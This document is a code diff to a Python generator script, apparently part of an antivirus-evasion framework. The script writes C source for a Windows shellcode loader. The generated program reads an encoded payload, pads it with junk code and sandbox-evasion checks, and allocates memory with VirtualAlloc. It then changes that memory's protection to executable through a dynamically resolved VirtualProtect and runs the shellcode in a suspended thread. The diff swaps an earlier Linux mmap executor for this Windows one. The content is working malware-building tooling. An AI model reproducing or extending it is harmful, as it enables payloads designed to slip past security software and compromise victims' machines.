@@ -19,16 +19,21 @@
      ########################################################################################
 
 import sys
-from random import shuffle  
+from random import shuffle 
 sys.path.append("Modules/payloads/auxiliar")
+from usefull import encoding_manager
+from usefull import readpayload_exfile
 from usefull import varname_creator
 from usefull import Junkmathinject
+from usefull import windows_evasion
+from usefull import spawn_multiple_process
+from usefull import close_brackets_multiproc
 
-Payload = sys.argv[1]
+Payload = readpayload_exfile()
 
-Filename = sys.argv[2]
+SpawnMultiProc = int(sys.argv[1])
 
-Encryption = sys.argv[3]
+Encryption = sys.argv[2]
 
 Randbufname = varname_creator()
 
@@ -38,11 +43,21 @@ Payload = DecodeKit[0]     # encoded shellcode
 
 DecoderStub = DecodeKit[1] # decoder stub or string = False if decoder is not necessary
 
-Randmem = varname_creator()
+Randlpv = varname_creator()
 
-Randptr = varname_creator()
+Randhand = varname_creator()
 
-Randinj = varname_creator()
+Randresult = varname_creator()
+
+Randthread = varname_creator()
+
+Oldprot = varname_creator()
+
+Randbool = varname_creator()
+
+Ndcvirtualpro = varname_creator()
+
+ResThread = varname_creator()
 
 Junkcode_01 = Junkmathinject()
 Junkcode_02 = Junkmathinject()
@@ -59,16 +74,30 @@ Junkcode_12 = Junkmathinject()
 Junkcode_13 = Junkmathinject()
 Junkcode_14 = Junkmathinject()
 Junkcode_15 = Junkmathinject()
+Junkcode_16 = Junkmathinject()
+Junkcode_17 = Junkmathinject()
+Junkcode_18 = Junkmathinject()
+Junkcode_19 = Junkmathinject()
+Junkcode_20 = Junkmathinject()
+Junkcode_21 = Junkmathinject()
+Junkcode_22 = Junkmathinject()
 
-MorphEvasion1 = Polymorph_Multipath_Evasion()
-MorphEvasion2 = Polymorph_Multipath_Evasion()
-MorphEvasion3 = Polymorph_Multipath_Evasion()
+WinEvasion_01 = windows_evasion()
+WinEvasion_02 = windows_evasion()
+WinEvasion_03 = windows_evasion()
+WinEvasion_04 = windows_evasion()
+WinEvasion_05 = windows_evasion()
+WinEvasion_06 = windows_evasion()
+WinEvasion_07 = windows_evasion()
+WinEvasion_08 = windows_evasion()
+WinEvasion_09 = windows_evasion()
+
 
 Hollow_code = ""
 
-Include_List = ["#include <stdlib.h>\n","##include <unistd.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <sys/mman.h>\n","#include <math.h>\n"]
+Include_List = ["#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <math.h>\n\n","#include <time.h>\n","#include <math.h>\n"]
 
-random.shuffle(Include_List)
+shuffle(Include_List)
 
 for i in range(0,len(Include_List)):
 
@@ -76,33 +105,55 @@ for i in range(0,len(Include_List)):
 
 Hollow_code += "int main(int argc,char * argv[]){\n"
 Hollow_code += Junkcode_01
-Hollow_code += MorphEvasion1
 Hollow_code += Junkcode_02
-Hollow_code += MorphEvasion2
 Hollow_code += Junkcode_03
-Hollow_code += MorphEvasion3
+Hollow_code += WinEvasion_01
+Hollow_code += WinEvasion_02
+Hollow_code += WinEvasion_03
+Hollow_code += WinEvasion_04
+Hollow_code += WinEvasion_05
+Hollow_code += WinEvasion_06
+Hollow_code += WinEvasion_07
+Hollow_code += WinEvasion_08
+Hollow_code += WinEvasion_09
 Hollow_code += Junkcode_04
-Hollow_code += Payload
 Hollow_code += Junkcode_05
-Hollow_code += "void *" + Randptr + ";"
+Hollow_code += spawn_multiple_process(SpawnMultiProc)
 Hollow_code += Junkcode_06
-Hollow_code += Randptr + " = mmap(0,sizeof(" + Randbufname + "),PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,-1,0);\n"
+Hollow_code += Payload
 Hollow_code += Junkcode_07
+Hollow_code += "LPVOID " + Randlpv + ";" + "HANDLE " + Randhand + ";" + "DWORD " + Randresult + ";" + "DWORD " + Randthread + ";\n"
 Hollow_code += Junkcode_08
+Hollow_code += Randlpv + " = VirtualAlloc(NULL, strlen(" + Randbufname + "),MEM_COMMIT,PAGE_READWRITE);\n"
 Hollow_code += Junkcode_09
 Hollow_code += Junkcode_10
+Hollow_code += Junkcode_11
 if DecoderStub != "False":
     Hollow_code += DecoderStub
-Hollow_code += "memcpy(" + Randptr + ","+ Randbufname + ", sizeof(" + Randbufname + "));\n"
-Hollow_code += Junkcode_11
-Hollow_code += "int " + Randinj + " = ((int(*)(void))" + Randptr + ")();}\n"
-Hollow_code += "else{" + Junkcode_12 + "}\n"
-Hollow_code += "}else{" + Junkcode_13 + "}\n"
-Hollow_code += "}else{" + Junkcode_14 + "}\n"
+Hollow_code += "RtlMoveMemory(" + Randlpv +","+ Randbufname + ",strlen(" + Randbufname + "));\n"
+Hollow_code += Junkcode_12
+Hollow_code += "DWORD " + Oldprot + ";\n"
+Hollow_code += Junkcode_13
+Hollow_code += "FARPROC " + Ndcvirtualpro + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualProtect\");\n"
+Hollow_code += "BOOL " + Randbool + " = (BOOL)" + Ndcvirtualpro + "(" + Randlpv + ",strlen(" + Randbufname + "),0x40,&" + Oldprot + ");\n"
+Hollow_code += Junkcode_14
+Hollow_code += Randhand + " = CreateThread(NULL,0," + Randlpv + ",NULL,0x00000004,&"+ Randthread + ");\n"
+Hollow_code += "DWORD " + ResThread + ";\n"
 Hollow_code += Junkcode_15
+Hollow_code += ResThread + " = ResumeThread("+ Randhand + ");\n"
+Hollow_code += Randresult + " = WaitForSingleObject(" + Randhand + ",-1);\n" 
+Hollow_code += close_brackets_multiproc(SpawnMultiProc)
+Hollow_code += "}}}else{" + Junkcode_16 + "}\n"
+Hollow_code += "}else{" + Junkcode_17 + "}\n"
+Hollow_code += "}else{" + Junkcode_18 + "}\n"
+Hollow_code += "}else{" + Junkcode_19 + "}\n"
+Hollow_code += "}else{" + Junkcode_20 + "}\n"
+Hollow_code += "}else{" + Junkcode_21 + "}\n"
+Hollow_code += "}else{" + Junkcode_22 + "}\n"
 Hollow_code += "return 0;}"
 Hollow_code = Hollow_code.encode('utf-8')
 
 with open('Source.c','wb') as f:
     f.write(Hollow_code)
+
 
